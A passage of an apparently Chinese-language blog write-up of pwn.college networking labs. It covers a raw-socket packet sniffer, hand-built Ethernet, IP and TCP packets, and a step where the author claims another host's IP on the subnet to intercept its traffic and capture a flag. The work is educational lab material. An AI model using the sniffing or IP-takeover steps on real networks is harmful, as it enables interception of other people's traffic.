Service&#x27;</span>: tos,</span><br><span class="line">        <span class="string">&#x27;Total Length&#x27;</span>: total_length,</span><br><span class="line">        <span class="string">&#x27;Identification&#x27;</span>: identification,</span><br><span class="line">        <span class="string">&#x27;Flags and Fragment Offset&#x27;</span>: flags_offset,</span><br><span class="line">        <span class="string">&#x27;TTL&#x27;</span>: ttl,</span><br><span class="line">        <span class="string">&#x27;Protocol&#x27;</span>: protocol,</span><br><span class="line">        <span class="string">&#x27;Header Checksum&#x27;</span>: checksum,</span><br><span class="line">        <span class="string">&#x27;Source IP&#x27;</span>: src_ip,</span><br><span class="line">        <span class="string">&#x27;Destination IP&#x27;</span>: dst_ip</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ip_header_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tcp_header</span>(<span class="params">data</span>):</span><br><span class="line">    tcp_header = struct.unpack(<span class="string">&#x27;!HHLLBBHHH&#x27;</span>, data[:<span class="number">20</span>])</span><br><span class="line">    src_port = tcp_header[<span class="number">0</span>]</span><br><span class="line">    dst_port = tcp_header[<span class="number">1</span>]</span><br><span class="line">    sequence = tcp_header[<span class="number">2</span>]</span><br><span class="line">    acknowledgment = tcp_header[<span class="number">3</span>]</span><br><span class="line">    offset_reserved_flags = tcp_header[<span class="number">4</span>]</span><br><span class="line">    data_offset = (offset_reserved_flags &gt;&gt; <span class="number">4</span>) * <span class="number">4</span></span><br><span class="line">    flags = tcp_header[<span class="number">5</span>]</span><br><span class="line">    window = tcp_header[<span class="number">6</span>]</span><br><span class="line">    checksum = tcp_header[<span class="number">7</span>]</span><br><span class="line">    urgent_pointer = tcp_header[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    tcp_header_info = &#123;</span><br><span class="line">        <span class="string">&#x27;Source Port&#x27;</span>: src_port,</span><br><span class="line">        <span class="string">&#x27;Destination Port&#x27;</span>: dst_port,</span><br><span class="line">        <span class="string">&#x27;Sequence Number&#x27;</span>: sequence,</span><br><span class="line">        <span class="string">&#x27;Acknowledgment Number&#x27;</span>: acknowledgment,</span><br><span class="line">        <span class="string">&#x27;Data Offset&#x27;</span>: data_offset,</span><br><span class="line">        <span class="string">&#x27;Flags&#x27;</span>: flags,</span><br><span class="line">        <span class="string">&#x27;Window Size&#x27;</span>: window,</span><br><span class="line">        <span class="string">&#x27;Checksum&#x27;</span>: checksum,</span><br><span class="line">        <span class="string">&#x27;Urgent Pointer&#x27;</span>: urgent_pointer</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tcp_header_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sniffer</span>(<span class="params">port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>, port))</span><br><span class="line">    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listening on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            packet, addr = sock.recvfrom(<span class="number">65565</span>)</span><br><span class="line">            ip_header = parse_ip_header(packet[:<span class="number">20</span>])</span><br><span class="line">            tcp_header = parse_tcp_header(packet[<span class="number">20</span>:<span class="number">40</span>])</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;IP Header:&quot;</span>, ip_header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;TCP Header:&quot;</span>, tcp_header)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Payload:&quot;</span>, packet[<span class="number">40</span>:])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sniffer stopped.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = <span class="number">31337</span></span><br><span class="line">    start_sniffer(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-6-Monitor-slow-traffic-from-a-remote-host"><a href="#2-6-Monitor-slow-traffic-from-a-remote-host" class="headerlink" title="2.6 Monitor slow traffic from a remote host"></a>2.6 Monitor slow traffic from a remote host</h3><p>首先使用<code>tshark -i eth0 -f &quot;tcp port 31337&quot; -w tcp_capture.pcap</code>抓取TCP数据包</p><p>然后使用wireshark 打开.pcap文件</p><p>右键点击数据包并点击Follow-&gt;TCP Stream 查看完整的TCP Stream内容</p><h3 id="2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface"><a href="#2-7-Hijack-traffic-from-a-remote-host-by-configuring-your-network-interface" class="headerlink" title="2.7 Hijack traffic from a remote host by configuring your network interface"></a>2.7 Hijack traffic from a remote host by configuring your network interface</h3><p>10.0.0.4试图与10.0.0.2建立连接，我们要在子网中的10.0.0.3中建立与10.0.0.4的连接并拦截数据包。</p><p>首先使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -nn -vv arp and host 10.0.0.4</span><br></pre></td></tr></table></figure><blockquote><ul><li>**<code>tcpdump</code>**：这是一个网络抓包工具，用于捕获和分析通过网络接口传输的数据包。</li><li>**<code>-i eth0</code>**：指定监听的网络接口，这里是 <code>eth0</code>。<code>tcpdump</code> 将在这个接口上捕获数据包。</li><li>**<code>-nn</code>**：禁用主机名和端口名的解析，将直接显示IP地址和端口号，而不是尝试将它们解析为主机名和服务名称。<code>-n</code> 选项是指不进行主机名解析，第二个 <code>-n</code> 则是指不进行端口名解析。</li><li>**<code>-vv</code>**：增加输出的详细程度，显示更详细的信息。<code>-v</code> 表示详细输出，<code>-vv</code> 则表示更详细的输出。</li><li>**<code>arp</code>**：指定只捕获 ARP（地址解析协议）数据包。</li><li>**<code>and host 10.0.0.4</code>**：进一步过滤数据包，只捕获与 IP 地址 <code>10.0.0.4</code> 相关的 ARP 数据包。</li></ul></blockquote><p>得到输出<code>07:11:37.169764 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.0.0.2 tell 10.0.0.4, length 28</code></p><p>我们知道<code>10.0.0.4</code>正在子网中通过ARP协议寻找<code>10.0.0.2</code>的MAC地址。</p><p>如何设置当前主机的IP地址为<code>10.0.0.3</code>呢?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure><p>这条命令将网络接口 <code>eth0</code> 关闭，使其停止工作。这意味着在此接口上将不再发送或接收任何数据包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.0.0.2 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>这条命令为 <code>eth0</code> 接口分配了一个新的 IP 地址和子网掩码。</p><p>**<code>10.0.0.2</code>**：这是分配给 <code>eth0</code> 接口的新的 IP 地址。</p><p>**<code>netmask 255.255.255.0</code>**：这是为 <code>eth0</code> 接口设置的子网掩码，表示该网络的子网范围（即 <code>10.0.0.x</code> 网络范围，子网掩码 255.255.255.0 表示该子网可以容纳 256 个 IP 地址，从 10.0.0.0 到 10.0.0.255）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure><p>重启 eth0接口，现在 <code>eth0</code> 将使用新分配的 IP 地址 <code>10.0.0.2</code> 和子网掩码 <code>255.255.255.0</code> 进行网络通信。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-3:~<span class="comment"># tcpdump -i eth0 -nn -vv arp and host 10.0.0.4</span></span><br><span class="line">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">07:32:39.844656 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">07:32:39.844683 ARP, Ethernet (len 6), IPv4 (len 4), Reply 10.0.0.2 is-at fe:b6:ce:6b:ab:98, length 28</span><br></pre></td></tr></table></figure><p>可以看出已经建立了连接。</p><p>接着查看端口31337中的数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 31337</span><br><span class="line">pwn.college&#123;E7AsHod1vWLoBCbJmzDx9s42l3A.dVjNzMDL5cjM1UzW&#125;</span><br></pre></td></tr></table></figure><ul><li>**<code>-l</code>**：表示 Netcat 以服务器模式启动，监听指定端口。</li><li>**<code>-v</code>**：启用详细输出模式，显示更多的连接信息。</li><li>**<code>-p 31337</code>**：指定 Netcat 监听的端口号为 <code>31337</code>。</li></ul><h3 id="2-8-Manually-send-an-Ethernet-packet"><a href="#2-8-Manually-send-an-Ethernet-packet" class="headerlink" title="2.8 Manually send an Ethernet packet"></a>2.8 Manually send an Ethernet packet</h3><p>任务是向10.0.0.3的主机发送以太网帧，能否连接网络不重要，不能使用scapy构建以太网帧，10.0.0.3的mac地址在ppt中找到，本机的mac地址使用ifconfig命令获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对方的MAC地址</span></span><br><span class="line">dst_mac = <span class="string">b&#x27;\xaa\xbb\xcc\xdd\xee\xff&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 您的MAC地址</span></span><br><span class="line">src_mac = <span class="string">b&#x27;\xa2\xd4\x52\x19\x77\xcc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EtherType</span></span><br><span class="line">ethertype = <span class="string">b&#x27;\xff\xff&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据负载 (可选)</span></span><br><span class="line">payload = <span class="string">b&#x27;Hello, Ethernet!&#x27;</span>  <span class="comment"># 这里可以是任意数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造以太网帧</span></span><br><span class="line">frame = dst_mac + src_mac + ethertype + payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)</span><br><span class="line">sock.bind((<span class="string">&quot;eth0&quot;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送以太网帧</span></span><br><span class="line">sock.send(frame)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ethernet frame sent!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-9-Manually-send-an-Internet-Protocol-packet"><a href="#2-9-Manually-send-an-Internet-Protocol-packet" class="headerlink" title="2.9 Manually send an Internet Protocol packet"></a>2.9 Manually send an Internet Protocol packet</h3><p>这里的问题是，默认情况下，<code>sock.sendto(packet, (dst_ip, 0))</code> 发送的 IP 数据包会通过系统的路由表决定从哪个网络接口发送，但当前环境是无妨访问网络的，主机默认使用eth0网络接口与外界通信，所以组装好的IP数据包要发送到eth0网络接口上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算IP头部校验和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">data</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">        w = (data[i] &lt;&lt; <span class="number">8</span>) + (data[i + <span class="number">1</span>])</span><br><span class="line">        s = s + w</span><br><span class="line">    s = (s &gt;&gt; <span class="number">16</span>) + (s &amp; <span class="number">0xffff</span>)</span><br><span class="line">    s = ~s &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造IP头部</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_ip_header</span>(<span class="params">src_ip, dst_ip, proto</span>):</span><br><span class="line">    ip_ver = <span class="number">4</span></span><br><span class="line">    ip_ihl = <span class="number">5</span></span><br><span class="line">    ip_ver_ihl = (ip_ver &lt;&lt; <span class="number">4</span>) + ip_ihl</span><br><span class="line">    ip_dscp_ecn = <span class="number">0</span></span><br><span class="line">    ip_tot_len = <span class="number">20</span> + <span class="number">8</span></span><br><span class="line">    ip_id = <span class="number">54321</span></span><br><span class="line">    ip_frag_off = <span class="number">0</span></span><br><span class="line">    ip_ttl = <span class="number">64</span></span><br><span class="line">    ip_proto = proto</span><br><span class="line">    ip_check = <span class="number">0</span></span><br><span class="line">    ip_src = socket.inet_aton(src_ip)</span><br><span class="line">    ip_dst = socket.inet_aton(dst_ip)</span><br><span class="line"></span><br><span class="line">    ip_header = struct.pack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>,</span><br><span class="line">                            ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag_off,</span><br><span class="line">                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)</span><br><span class="line">    ip_check = checksum(ip_header)</span><br><span class="line">    ip_header = struct.pack(<span class="string">&#x27;!BBHHHBBH4s4s&#x27;</span>,</span><br><span class="line">                            ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_frag_off,</span><br><span class="line">                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)</span><br><span class="line">    <span class="keyword">return</span> ip_header</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机的IP地址</span></span><br><span class="line">src_ip = <span class="string">&quot;10.0.0.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标主机的IP地址</span></span><br><span class="line">dst_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IP协议字段设置为0xFF</span></span><br><span class="line">proto = <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造IP头部</span></span><br><span class="line">ip_header = construct_ip_header(src_ip, dst_ip, proto)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据负载 (可选)</span></span><br><span class="line">payload = <span class="string">b&quot;Hello, IP Protocol 0xFF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终数据包</span></span><br><span class="line">packet = ip_header + payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定到eth0接口</span></span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, <span class="number">25</span>, <span class="string">b&#x27;eth0&#x27;</span> + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送IP数据包</span></span><br><span class="line">sock.sendto(packet, (dst_ip, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IP packet sent to 10.0.0.3 with IP protocol 0xFF&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-10-Manually-send-a-Transmission-Control-Protocol-packet"><a href="#2-10-Manually-send-a-Transmission-Control-Protocol-packet" class="headerlink" title="2.10 Manually send a Transmission Control Protocol packet"></a>2.10 Manually send a Transmission Control Protocol packet</h3><p>使用python构建一个TCP 包，然后将socket绑定到eth0上发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算TCP头部的校验和。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 每次处理两个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">2</span>):</span><br><span class="line">        w = (msg[i] &lt;&lt; <span class="number">8</span>) + (msg[i + <span class="number">1</span>])</span><br><span class="line">        s = s + w</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理进位</span></span><br><span class="line">    s = (s &gt;&gt; <span class="number">16</span>) + (s &amp; <span class="number">0xffff</span>)</span><br><span class="line">    s = s + (s &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 取反并只保留低16位</span></span><br><span class="line">    s = ~s &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_tcp_packet</span>(<span class="params">source_ip, dest_ip, source_port, dest_port, seq, ack_seq, flags, user_data=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建一个TCP包。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    doff = <span class="number">5</span>  <span class="comment"># 数据偏移量，表示头部长度（5 * 4 = 20字节）</span></span><br><span class="line">    window = socket.htons(<span class="number">5840</span>)  <span class="comment"># 窗口大小，最大允许窗口大小</span></span><br><span class="line">    urg_ptr = <span class="number">0</span>  <span class="comment"># 紧急指针（通常为0）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析TCP标志位</span></span><br><span class="line">    urg = (flags &amp; <span class="number">0x20</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line">    ack = (flags &amp; <span class="number">0x10</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">    psh = (flags &amp; <span class="number">0x08</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">    rst = (flags &amp; <span class="number">0x04</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">    syn = (flags &amp; <span class="number">0x02</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    fin = flags &amp; <span class="number">0x01</span></span><br><span class="line"></span><br><span class="line">    offset_res = (doff &lt;&lt; <span class="number">4</span>) + <span class="number">0</span>  <span class="comment"># 数据偏移量和保留位</span></span><br><span class="line">    tcp_flags = fin + (syn &lt;&lt; <span class="number">1</span>) + (rst &lt;&lt; <span class="number">2</span>) + (psh &lt;&lt; <span class="number">3</span>) + (ack &lt;&lt; <span class="number">4</span>) + (urg &lt;&lt; <span class="number">5</span>)  <span class="comment"># 组合TCP标志位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建TCP头部</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">&#x27;!HHLLBBHHH&#x27;</span>, source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, <span class="number">0</span>, urg_ptr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造伪头部，用于校验和计算</span></span><br><span class="line">    source_ip = socket.inet_aton(source_ip)  <span class="comment"># 源IP地址</span></span><br><span class="line">    dest_ip = socket.inet_aton(dest_ip)      <span class="comment"># 目标IP地址</span></span><br><span class="line">    placeholder = <span class="number">0</span>  <span class="comment"># 占位符</span></span><br><span class="line">    protocol = socket.IPPROTO_TCP  <span class="comment"># 协议类型（TCP）</span></span><br><span class="line">    tcp_length = <span class="built_in">len</span>(tcp_header) + <span class="built_in">len</span>(user_data)  <span class="comment"># TCP包长度</span></span><br><span class="line"></span><br><span class="line">    pseudo_header = struct.pack(<span class="string">&#x27;!4s4sBBH&#x27;</span>, source_ip, dest_ip, placeholder, protocol, tcp_length)</span><br><span class="line">    pseudo_header = pseudo_header + tcp_header + user_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算TCP校验和</span></span><br><span class="line">    tcp_checksum = checksum(pseudo_header)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重新打包TCP头部，包含校验和</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">&#x27;!HHLLBBH&#x27;</span>, source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window) + struct.pack(<span class="string">&#x27;H&#x27;</span>, tcp_checksum) + struct.pack(<span class="string">&#x27;!H&#x27;</span>, urg_ptr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tcp_header + user_data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建原始套接字</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)</span><br><span class="line"><span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;无法创建套接字。错误代码 : <span class="subst">&#123;msg[<span class="number">0</span>]&#125;</span> 错误信息: <span class="subst">&#123;msg[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定到eth0接口</span></span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, <span class="string">b&#x27;eth0\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">source_ip = <span class="string">&#x27;10.0.0.2&#x27;</span>  <span class="comment"># 源IP地址（根据需要修改）</span></span><br><span class="line">dest_ip = <span class="string">&#x27;10.0.0.3&#x27;</span>    <span class="comment"># 目标IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP包的字段</span></span><br><span class="line">source_port = <span class="number">31337</span></span><br><span class="line">dest_port = <span class="number">31337</span></span><br><span class="line">seq = <span class="number">31337</span></span><br><span class="line">ack_seq = <span class="number">31337</span></span><br><span class="line">flags = <span class="number">0x1F</span>  <span class="comment"># 标志位对应APRSF (ACK=0x10, PSH=0x08, RST=0x04, SYN=0x02, FIN=0x01)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造TCP包</span></span><br><span class="line">tcp_packet = create_tcp_packet(source_ip, dest_ip, source_port, dest_port, seq, ack_seq, flags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包</span></span><br><span class="line">s.sendto(tcp_packet, (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;数据包已通过eth0发送到 <span class="subst">&#123;dest_ip&#125;</span>:<span class="subst">&#123;dest_port&#125;</span>，标志位为APRSF。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-11-Manually-perform-a-Transmission-Control-Protocol-handshake"><a href="#2-11-Manually-perform-a-Transmission-Control-Protocol-handshake" class="headerlink" title="2.11 Manually perform a Transmission Control Protocol handshake"></a>2.11 Manually perform a Transmission Control Protocol handshake</h3><p>这里要完成一个TCP的handshake操作，当我们运行下面的代码后会发现输出：</p><blockquote><p>root@ip-10-0-0-2:~# python BaWS&#x2F;I2C&#x2F;2_11.py<br>Sending SYN packet: IP &#x2F; TCP 10.0.0.2:31337 &gt; 10.0.0.3:31337 S<br>WARNING: No route found (no default route?)<br>Begin emission:<br>WARNING: No route found (no default route?)<br>WARNING: more No route found (no default route?)</p></blockquote><p>提示我们网络接口配置配置有问题，通过ifconfig命令发现，eth0接口没有配置ipv4地址，手动配置<code>ip addr add 10.0.0.2/24 dev eth0</code>：</p><blockquote><p>root@ip-10-0-0-2:~# ifconfig eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::8c96:7bff:fe9c:4172 prefixlen 64 scopeid 0x20 ether 8e:96:7b:9c:41:72 txqueuelen 1000 (Ethernet) RX packets 49 bytes 3802 (3.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1172 (1.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p><p>lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 11 bytes 440 (440.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 11 bytes 440 (440.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 